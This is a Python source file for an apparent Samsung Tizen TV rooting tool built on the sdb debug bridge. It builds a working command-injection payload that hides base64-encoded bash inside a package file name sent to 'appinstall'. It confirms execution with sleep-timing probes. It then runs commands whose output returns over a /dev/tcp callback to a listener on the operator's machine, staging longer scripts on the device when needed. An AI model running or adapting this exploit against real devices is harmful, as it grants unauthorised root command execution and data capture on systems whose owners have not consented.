from __future__ import annotations

import base64
import os
import re
import select
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path, PurePosixPath


SDB_PORT = 26101
SDB_BRIDGE_PORT = 26103
SDB_BRIDGE_TOKEN_LENGTH = 32
DEFAULT_TIMEOUT = 10.0
DEFAULT_CAPTURE_TIMEOUT = 30.0
SDB_APPINSTALL_PREFIX = "0 appinstall tpk "
SDB_APPINSTALL_MAX_SAFE_BYTES = 510
SHELL_INJECTION_DELAY_SECONDS = 2.0
SHELL_INJECTION_MINIMUM_DELTA = 1.5
REMOTE_SCRIPT_DIRECTORY = PurePosixPath("/home/owner/share/tmp/sdk_tools")


class SdbError(RuntimeError):
    pass


def build_shell_injection(command: str, gate_token: str | None = None) -> str:
    token = gate_token or os.urandom(8).hex()
    if not token or any(character not in "0123456789abcdef" for character in token):
        raise ValueError("shell injection gate token must be lowercase hexadecimal")
    script = f"/bin/mkdir /tmp/s-{token} 2>/dev/null&&{{ {command};}}"
    encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
    return f"new2.tpk`printf${{IFS}}%s${{IFS}}{encoded}|base64${{IFS}}-d|bash`.tpk"


def sdb_candidates() -> tuple[Path, ...]:
    executable = "sdb.exe" if os.name == "nt" else "sdb"
    candidates: list[Path] = []

    configured = os.environ.get("SDB")
    if configured:
        candidates.append(Path(configured).expanduser())

    on_path = shutil.which(executable) or shutil.which("sdb")
    if on_path:
        candidates.append(Path(on_path))

    home = Path.home()
    candidates.extend(
        (
            home / "tizen-studio" / "tools" / executable,
            home / "TizenStudio" / "tools" / executable,
        )
    )
    if os.name == "nt":
        system_drive = os.environ.get("SystemDrive", "C:").rstrip("\\/") + "\\"
        candidates.extend(
            Path(root) / "tizen-studio" / "tools" / executable
            for root in (
                system_drive,
                os.environ.get("ProgramFiles", "C:/Program Files"),
                os.environ.get("LOCALAPPDATA", str(home / "AppData" / "Local")),
            )
        )
    elif sys.platform == "darwin":
        candidates.extend(
            (
                Path("/Applications/TizenStudio.app/Contents/tools/sdb"),
                Path("/opt/tizen-studio/tools/sdb"),
            )
        )
    else:
        candidates.extend(
            (
                Path("/opt/tizen-studio/tools/sdb"),
                Path("/usr/local/tizen-studio/tools/sdb"),
            )
        )

    unique: list[Path] = []
    seen: set[str] = set()
    for candidate in candidates:
        marker = os.path.normcase(str(candidate.expanduser()))
        if marker not in seen:
            unique.append(candidate.expanduser())
            seen.add(marker)
    return tuple(unique)


def discover_sdb() -> Path | None:
    for candidate in sdb_candidates():
        if candidate.is_file():
            return candidate.resolve()
    return None


def find_sdb() -> Path:
    discovered = discover_sdb()
    if discovered is not None:
        return discovered
    raise SdbError(
        "Samsung sdb was not found; install Tizen Studio or pass "
        "--sdb /absolute/path/to/sdb"
    )


def route_callback_host(tv_host: str) -> str:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route_socket:
        route_socket.connect((tv_host, 9))
        return str(route_socket.getsockname()[0])


def command_failure(
    operation: str,
    result: subprocess.CompletedProcess[str],
) -> str:
    detail = "\n".join(
        value.strip() for value in (result.stdout, result.stderr) if value.strip()
    )
    return f"{operation} failed with exit {result.returncode}" + (
        f": {detail}" if detail else ""
    )


@dataclass(frozen=True)
class CaptureResult:
    output: str
    transport_returncode: int


class SdbBridgeProxy:
    def __init__(
        self,
        tv_host: str,
        bridge_port: int,
        token: str,
    ) -> None:
        if not re.fullmatch(r"[0-9a-f]{32}", token):
            raise SdbError("bridge token must be 32 lowercase hexadecimal characters")
        if not 1 <= bridge_port <= 65535:
            raise SdbError("bridge port must be between 1 and 65535")
        self.tv_host = tv_host
        self.bridge_port = bridge_port
        self.token = token.encode("ascii")
        self._listener: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self._stopping = threading.Event()

    @property
    def serial(self) -> str:
        if self._listener is None:
            raise SdbError("SDB bridge proxy has not started")
        return f"127.0.0.1:{self._listener.getsockname()[1]}"

    def start(self) -> None:
        if self._listener is not None:
            return
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("127.0.0.1", 0))
        listener.listen(8)
        listener.settimeout(0.5)
        self._listener = listener
        self._thread = threading.Thread(
            target=self._accept_connections,
            name="sdb-bridge-proxy",
            daemon=True,
        )
        self._thread.start()

    def close(self) -> None:
        self._stopping.set()
        if self._listener is not None:
            self._listener.close()
            self._listener = None
        if self._thread is not None:
            self._thread.join(timeout=1.0)
            self._thread = None

    def _accept_connections(self) -> None:
        listener = self._listener
        if listener is None:
            return
        while not self._stopping.is_set():
            try:
                client, _ = listener.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            threading.Thread(
                target=self._relay,
                args=(client,),
                name="sdb-bridge-session",
                daemon=True,
            ).start()

    def _relay(self, client: socket.socket) -> None:
        remote: socket.socket | None = None
        try:
            remote = socket.create_connection(
                (self.tv_host, self.bridge_port), timeout=5.0
            )
            remote.settimeout(None)
            remote.sendall(self.token)
            client.settimeout(None)
            finished = threading.Event()
            threading.Thread(
                target=self._pump,
                args=(client, remote, finished),
                daemon=True,
            ).start()
            threading.Thread(
                target=self._pump,
                args=(remote, client, finished),
                daemon=True,
            ).start()
            finished.wait()
        except OSError:
            pass
        finally:
            try:
                client.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            client.close()
            if remote is not None:
                try:
                    remote.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                remote.close()

    @staticmethod
    def _pump(
        source: socket.socket,
        destination: socket.socket,
        finished: threading.Event,
    ) -> None:
        try:
            while True:
                readable, _, exceptional = select.select([source], [], [source])
                if exceptional or not readable:
                    return
                payload = source.recv(65536)
                if not payload:
                    return
                destination.sendall(payload)
        except OSError:
            return
        finally:
            finished.set()


class SdbClient:
    def __init__(
        self,
        executable: Path,
        tv_host: str,
        *,
        timeout: float = DEFAULT_TIMEOUT,
        bridge_token: str | None = None,
        bridge_port: int = SDB_BRIDGE_PORT,
    ) -> None:
        self.executable = executable
        self.tv_host = tv_host
        self.timeout = timeout
        self.bridge_token = bridge_token or os.environ.get("TVROOT_BRIDGE_TOKEN")
        self.bridge_port = bridge_port
        self._bridge_proxy: SdbBridgeProxy | None = None

    @property
    def serial(self) -> str:
        if self._bridge_proxy is not None:
            return self._bridge_proxy.serial
        return f"{self.tv_host}:{SDB_PORT}"

    def connect(self) -> None:
        # The sdb server holds a single loopback-device slot: a stale
        # 127.0.0.1:* entry (dead proxy, e.g. after a TV reboot) makes every
        # new `sdb connect 127.0.0.1:<proxy>` fail until it is disconnected.
        # Sweep them first (verified live 2026-10-09).
        if self.bridge_token:
            self._sweep_stale_loopback_devices()
        if self.bridge_token and self._bridge_proxy is None:
            self._bridge_proxy = SdbBridgeProxy(
                self.tv_host,
                self.bridge_port,
                self.bridge_token,
            )
            self._bridge_proxy.start()
        try:
            result = self.run(("connect", self.serial), check=False)
        except Exception:
            if self._bridge_proxy is not None:
                self._bridge_proxy.close()
                self._bridge_proxy = None
            raise
        if result.returncode != 0:
            if self._bridge_proxy is not None:
                self._bridge_proxy.close()
                self._bridge_proxy = None
            raise SdbError(command_failure("sdb connect", result))

    def _sweep_stale_loopback_devices(self) -> None:
        try:
            result = self.run(("devices",), check=False)
        except Exception:
            return
        for line in result.stdout.splitlines():
            fields = line.split()
            if fields and fields[0].startswith("127.0.0.1:"):
                self.run(("disconnect", fields[0]), check=False)

    def require_device(self) -> None:
        result = self.run(("devices",), check=True)
        for line in result.stdout.splitlines():
            fields = line.split()
            if fields and fields[0] == self.serial:
                state = fields[1] if len(fields) > 1 else "unknown"
                if state == "device":
                    return
                raise SdbError(f"SDB device {self.serial} is {state}, not ready")
        raise SdbError(f"SDB device {self.serial} is not listed by sdb devices")

    def disconnect(self) -> None:
        try:
            self.run(("disconnect", self.serial), check=False)
        finally:
            if self._bridge_proxy is not None:
                self._bridge_proxy.close()
                self._bridge_proxy = None

    def push(self, local_path: Path, remote_path: PurePosixPath) -> None:
        result = self.run(
            ("-s", self.serial, "push", str(local_path), str(remote_path)),
            check=False,
            timeout=max(self.timeout, 15.0),
        )
        if result.returncode != 0 or sdb_reported_error(result):
            raise SdbError(command_failure(f"sdb push {local_path.name}", result))

    def pull(self, remote_path: PurePosixPath, local_path: Path) -> None:
        result = self.run(
            ("-s", self.serial, "pull", str(remote_path), str(local_path)),
            check=False,
            timeout=max(self.timeout, 30.0),
        )
        if result.returncode != 0 or sdb_reported_error(result):
            raise SdbError(command_failure(f"sdb pull {remote_path}", result))

    def inject(
        self,
        command: str,
        *,
        timeout: float | None = None,
    ) -> subprocess.CompletedProcess[str]:
        injection = build_shell_injection(command)
        argument = f"{SDB_APPINSTALL_PREFIX}{injection}"
        argument_size = len(argument.encode("utf-8"))
        if argument_size > SDB_APPINSTALL_MAX_SAFE_BYTES:
            raise SdbError(
                f"SDB appinstall injection is {argument_size} bytes; maximum safe "
                f"size is {SDB_APPINSTALL_MAX_SAFE_BYTES}. Stage the command first."
            )
        return self.run(
            ("-s", self.serial, "shell", argument),
            check=False,
            timeout=timeout or self.timeout,
        )

    def require_shell_injection(self) -> None:
        timeout = max(self.timeout, SHELL_INJECTION_DELAY_SECONDS + 5.0)
        control_elapsed, control = self._timed_injection("/bin/true", timeout)
        delayed_elapsed, delayed = self._timed_injection(
            f"/bin/sleep {SHELL_INJECTION_DELAY_SECONDS:g}", timeout
        )
        delay_delta = delayed_elapsed - control_elapsed
        # The first SDB shell call can include setup time unrelated to the payload.
        if (
            delay_delta < SHELL_INJECTION_MINIMUM_DELTA
            and control_elapsed >= SHELL_INJECTION_MINIMUM_DELTA
        ):
            control_elapsed, control = self._timed_injection("/bin/true", timeout)
            delayed_elapsed, delayed = self._timed_injection(
                f"/bin/sleep {SHELL_INJECTION_DELAY_SECONDS:g}", timeout
            )
            delay_delta = delayed_elapsed - control_elapsed
        if delay_delta < SHELL_INJECTION_MINIMUM_DELTA:
            details = []
            for name, result in (("control", control), ("delayed", delayed)):
                output = _completed_output(result)
                if output:
                    details.append(f"{name} output: {output}")
            suffix = f"; {'; '.join(details)}" if details else ""
            raise SdbError(
                "SDB is connected, but package-name shell execution was not "
                f"confirmed: control took {control_elapsed:.3f}s and the "
                f"{SHELL_INJECTION_DELAY_SECONDS:g}s delay probe took "
                f"{delayed_elapsed:.3f}s (delta {delay_delta:.3f}s, expected at "
                f"least {SHELL_INJECTION_MINIMUM_DELTA:g}s){suffix}"
            )

    def _timed_injection(
        self, command: str, timeout: float
    ) -> tuple[float, subprocess.CompletedProcess[str]]:
        started = time.monotonic()
        result = self.inject(command, timeout=timeout)
        elapsed = time.monotonic() - started
        if result.returncode not in (0, 1):
            raise SdbError(command_failure("SDB shell-injection probe", result))
        return elapsed, result

    def capture(
        self,
        command: str,
        *,
        callback_host: str | None = None,
        bind_host: str | None = None,
        port: int = 0,
        timeout: float = DEFAULT_CAPTURE_TIMEOUT,
        on_listening: Callable[[str, str, int], None] | None = None,
    ) -> CaptureResult:
        callback = callback_host or route_callback_host(self.tv_host)
        bind = bind_host or callback
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                listener.bind((bind, port))
            except OSError as error:
                raise SdbError(
                    f"cannot listen for TV callback on {bind}:{port}: {error}"
                ) from error
            listener.listen(1)
            listener.settimeout(timeout)
            callback_port = int(listener.getsockname()[1])
            wrapped = (
                f"exec 3<>/dev/tcp/{callback}/{callback_port};"
                f"{{ {command}; }} >&3 2>&3;"
                "printf '\\n[exit:%s]\\n' \"$?\" >&3;exec 3>&-"
            )
            launch_command = wrapped
            if _injection_argument_size(wrapped) > SDB_APPINSTALL_MAX_SAFE_BYTES:
                launch_command = self._stage_script(wrapped)
            if on_listening is not None:
                on_listening(callback, bind, callback_port)
            state: dict[str, object] = {}

            def launch() -> None:
                try:
                    state["result"] = self.inject(launch_command, timeout=timeout)
                except BaseException as error:
                    state["error"] = error

            worker = threading.Thread(target=launch, name="sdb-injection", daemon=True)
            worker.start()
            try:
                connection, _ = listener.accept()
            except TimeoutError as error:
                worker.join(timeout=0.25)
                failure = state.get("error")
                if isinstance(failure, BaseException):
                    raise SdbError(
                        f"TV did not connect to callback {callback}:{callback_port} "
                        f"within {timeout:g}s; listener {bind}:{callback_port} was "
                        f"active, but SDB injection failed: {failure}"
                    ) from failure
                result = state.get("result")
                if isinstance(result, subprocess.CompletedProcess):
                    detail = command_failure("SDB injection", result)
                    if result.returncode not in (0, 1):
                        raise SdbError(
                            f"{detail}; no TV callback reached "
                            f"{callback}:{callback_port}"
                        ) from error
                    injection = f"SDB injection exited {result.returncode}"
                    output = _completed_output(result)
                    if output:
                        injection += f": {output}"
                else:
                    injection = "SDB injection was still running"
                raise SdbError(
                    f"TV did not connect to callback {callback}:{callback_port} "
                    f"within {timeout:g}s; listener {bind}:{callback_port} was active "
                    f"and {injection}. Check the inbound firewall, callback route, "
                    "and Developer Mode host IP."
                ) from error
            with connection:
                connection.settimeout(timeout)
                chunks: list[bytes] = []
                while True:
                    try:
                        data = connection.recv(65536)
                    except TimeoutError as error:
                        raise SdbError(
                            f"TV callback stopped responding after {timeout:g}s"
                        ) from error
                    if not data:
                        break
                    chunks.append(data)
            worker.join(timeout=1.0)
            failure = state.get("error")
            if isinstance(failure, BaseException):
                raise SdbError(str(failure)) from failure
            result = state.get("result")
            return CaptureResult(
                output=b"".join(chunks).decode("utf-8", errors="replace"),
                transport_returncode=(
                    result.returncode
                    if isinstance(result, subprocess.CompletedProcess)
                    else 0
                ),
            )

    def _stage_script(self, command: str) -> str:
        token = os.urandom(8).hex()
        remote_path = REMOTE_SCRIPT_DIRECTORY / (
            f".samsung-tv-root-capture-{token}.sh"
        )
        with tempfile.TemporaryDirectory(
            prefix="samsung-tv-root-capture-"
        ) as directory:
            local_path = Path(directory) / "capture.sh"
            local_path.write_text(
                f"/bin/rm -f {remote_path}\n{command}\n",
                encoding="utf-8",
                newline="\n",
            )
            self.push(local_path, remote_path)
        return f". {remote_path}"

    def run(
        self,
        arguments: tuple[str, ...],
        *,
        check: bool,
        timeout: float | None = None,
    ) -> subprocess.CompletedProcess[str]:
        effective_timeout = timeout or self.timeout
        try:
            result = subprocess.run(
                (str(self.executable), *arguments),
                text=True,
                capture_output=True,
                timeout=effective_timeout,
                check=False,
            )
        except subprocess.TimeoutExpired as error:
            raise SdbError(
                f"sdb command timed out after {effective_timeout:g}s"
            ) from error
        if check and result.returncode != 0:
            raise SdbError(command_failure("sdb", result))
        return result


def _completed_output(result: subprocess.CompletedProcess[str]) -> str:
    return "\n".join(
        value.strip() for value in (result.stdout, result.stderr) if value.strip()
    )


def _injection_argument_size(command: str) -> int:
    injection = build_shell_injection(command, gate_token="0" * 16)
    return len(f"{SDB_APPINSTALL_PREFIX}{injection}".encode("utf-8"))


def sdb_reported_error(result: subprocess.CompletedProcess[str]) -> bool:
    return any(
        line.lstrip().lower().startswith("error:")
        for output in (result.stdout, result.stderr)
        for line in output.splitlines()
    )
